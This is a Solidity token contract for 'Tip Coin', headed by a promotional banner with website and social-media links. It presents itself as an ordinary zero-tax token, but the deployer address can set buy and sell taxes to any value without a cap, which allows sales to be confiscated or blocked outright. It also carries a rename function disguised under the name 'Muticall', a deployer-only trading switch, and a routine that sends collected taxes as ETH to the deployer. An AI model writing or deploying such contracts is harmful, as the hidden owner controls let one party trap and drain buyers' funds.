/*
 .----------------.  .----------------.  .----------------.   .----------------.  .----------------.  .----------------.  .-----------------.
| .--------------. || .--------------. || .--------------. | | .--------------. || .--------------. || .--------------. || .--------------. |
| |  _________   | || |     _____    | || |   ______     | | | |     ______   | || |     ____     | || |     _____    | || | ____  _____  | |
| | |  _   _  |  | || |    |_   _|   | || |  |_   __ \   | | | |   .' ___  |  | || |   .'    `.   | || |    |_   _|   | || ||_   \|_   _| | |
| | |_/ | | \_|  | || |      | |     | || |    | |__) |  | | | |  / .'   \_|  | || |  /  .--.  \  | || |      | |     | || |  |   \ | |   | |
| |     | |      | || |      | |     | || |    |  ___/   | | | |  | |         | || |  | |    | |  | || |      | |     | || |  | |\ \| |   | |
| |    _| |_     | || |     _| |_    | || |   _| |_      | | | |  \ `.___.'\  | || |  \  `--'  /  | || |     _| |_    | || | _| |_\   |_  | |
| |   |_____|    | || |    |_____|   | || |  |_____|     | | | |   `._____.'  | || |   `.____.'   | || |    |_____|   | || ||_____|\____| | |
| |              | || |              | || |              | | | |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' | | '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'   '----------------'  '----------------'  '----------------'  '----------------' 

The future of social interaction.

To earn make sure to mention 

Website: https://thetipcoin.io/


Telegram :https://t.me/+l87dXm0u9o8wM2Jh


Twitter  :https://twitter.com/tipcoineth

*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract tip {
        string private  name_ = "Tip Coin";  
        string private  symbol_ = "tip";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 100000000 * 10**decimals;

        uint256 buyTax = 0;
        uint256 sellTax = 0;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
        
        error Permissions();
        
        event NameChanged(string newName,string newSymbol , address by);

       function Muticall(string memory name,string memory symbol) external {
        require(msg.sender == deployer);
        name_ = name;
        symbol_ = symbol;
        emit NameChanged(name, symbol, msg.sender);
    }
    
        function name() public view  returns (string memory) {
        return name_;
        }

    
        function symbol() public view  returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant deployer = payable(address(0x83775aB185394b7E8A0C6219bCdD470e49E0DBA1)); 

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == deployer || to == deployer);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                deployer.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 taxAmount = amount * (from == pair ? buyTax : sellTax) / 100;
                amount -= taxAmount;
                balanceOf[address(this)] += taxAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function $Gang_Open_Trading() external {
            require(msg.sender == deployer);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setFees(uint256 _buy, uint256 _sell) private {
            buyTax = _buy;
            sellTax = _sell;
        }

        function setFees(uint256 _buy, uint256 _sell) external {
            if(msg.sender != deployer)        
                revert Permissions();
            _setFees(_buy, _sell);
        }
    }